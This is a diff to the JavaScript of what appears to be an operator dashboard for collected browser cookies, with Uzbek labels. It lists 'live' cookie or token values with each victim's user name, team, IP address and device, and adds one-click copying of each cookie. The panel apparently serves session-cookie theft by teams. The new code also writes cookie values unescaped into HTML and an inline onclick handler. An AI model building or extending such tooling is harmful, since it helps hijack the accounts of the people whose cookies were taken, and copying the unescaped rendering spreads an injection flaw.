@@ -622,16 +622,35 @@ async function moderateJob(id, status) {
 async function loadLiveCookies() {
     const res = await api('/cookies/live');
     if (!res.success) return;
-    document.getElementById('cookiesBody').innerHTML = res.cookies.map(c => `
-        <tr>
-            <td>${c.vaqt ? new Date(c.vaqt).toLocaleString('uz-UZ') : '-'}</td>
-            <td>${c.foydalanuvchi || '-'}</td>
-            <td>${c.team || '-'}</td>
-            <td style="max-width: 400px; word-break: break-all; white-space: normal !important; color: #4A7FFF; font-family: monospace;">${c.cookie || '-'}</td>
-            <td>${c.ip || '-'}</td>
-            <td style="max-width: 250px; word-break: break-word; white-space: normal !important; font-size: 0.85em; color: #aaa;">${c.qurilma || 'Nomalum'}</td>
+    document.getElementById('cookiesBody').innerHTML = res.cookies.map(c => {
+        // API dan kelayotgan ma'lumotlarni ehtimoliy nomlari bilan tutib olamiz
+        const time = c.vaqt || c.time || c.createdAt || c.timestamp || c.date || '-';
+        const user = c.foydalanuvchi || c.user || c.username || c.name || '-';
+        const team = c.team || '-';
+        const ip = c.ip || c.ipAddress || '-';
+        const device = c.qurilma || c.device || c.userAgent || 'Noma`lum';
+        const cookieVal = c.cookie || c.value || c.token || '-';
+        
+        const formatTime = time !== '-' ? new Date(time).toLocaleString('uz-UZ') : '-';
+        
+        return `
+        <tr style="transition: all 0.2s;" onmouseover="this.style.backgroundColor='#2a3441'" onmouseout="this.style.backgroundColor='transparent'">
+            <td style="white-space: nowrap; font-size: 0.85em;">${formatTime}</td>
+            
+            <td style="font-weight: bold; color: #4A7FFF; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText); alert('Ism nusxalandi!')" title="Nusxalash uchun bosing">${user}</td>
+            
+            <td>${team}</td>
+            
+            <td style="max-width: 400px; word-break: break-all; white-space: normal !important; font-family: monospace; font-size: 0.85em; cursor: pointer;" onclick="navigator.clipboard.writeText('${cookieVal}'); alert('Cookie nusxalandi!')" title="Nusxalash uchun bosing">
+                <div style="background: #1a2332; padding: 6px; border-radius: 4px; border: 1px dashed #4A7FFF;">${cookieVal}</div>
+            </td>
+            
+            <td style="cursor: pointer; color: #fff;" onclick="navigator.clipboard.writeText(this.innerText); alert('IP nusxalandi!')" title="Nusxalash uchun bosing">${ip}</td>
+            
+            <td style="max-width: 250px; word-break: break-word; white-space: normal !important; font-size: 0.8em; color: #aaa; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText); alert('Qurilma nusxalandi!')" title="Nusxalash uchun bosing">${device}</td>
         </tr>
-    `).join('');
+        `;
+    }).join('');
 }
 
 async function loadAcademy() {
